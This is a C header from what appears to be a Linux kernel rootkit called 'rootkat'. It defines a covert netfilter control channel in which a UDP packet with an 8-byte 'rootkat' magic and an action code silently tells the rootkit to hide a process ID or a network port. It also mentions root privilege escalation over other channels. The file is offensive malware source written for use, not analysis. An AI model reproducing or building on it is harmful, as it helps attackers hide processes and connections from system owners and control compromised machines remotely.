/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_NETFILTER_H
#define ROOTKAT_HOOK_NETFILTER_H

/*
 * Network covert-channel control surface.
 *
 * A UDP packet (any source/dest port) whose payload begins with the
 * 16-byte magic frame triggers a rootkat action and is then dropped
 * before reaching any local socket. No listening socket needed on
 * this host — the rootkit "hears" packets via netfilter regardless
 * of whether userspace would ever read them.
 *
 * Frame layout (16 bytes):
 *   bytes  0..7  = "rootkat\0"  (8-byte magic)
 *   byte   8     = action code
 *   bytes  9..11 = reserved (must be 0)
 *   bytes 12..15 = u32 argument, network byte order
 *
 * Action codes:
 *   1 = hide PID  (arg = pid_t)
 *   2 = hide port (arg = port number, low 16 bits used)
 *
 * Privesc is intentionally NOT exposed on this channel: it would
 * require a target task context, and an inbound network packet has
 * no notion of "the caller" — the natural equivalent (privesc PID X
 * to root) is reachable on the kill / io_uring channels.
 */

#define ROOTKAT_NET_MAGIC      "rootkat\0"   /* 8 bytes incl. trailing NUL */
#define ROOTKAT_NET_MAGIC_LEN  8
#define ROOTKAT_NET_FRAME_LEN  16

#define ROOTKAT_NET_ACT_HIDE_PID    1
#define ROOTKAT_NET_ACT_HIDE_PORT   2

int rootkat_hook_netfilter_install(void);
void rootkat_hook_netfilter_remove(void);

#endif
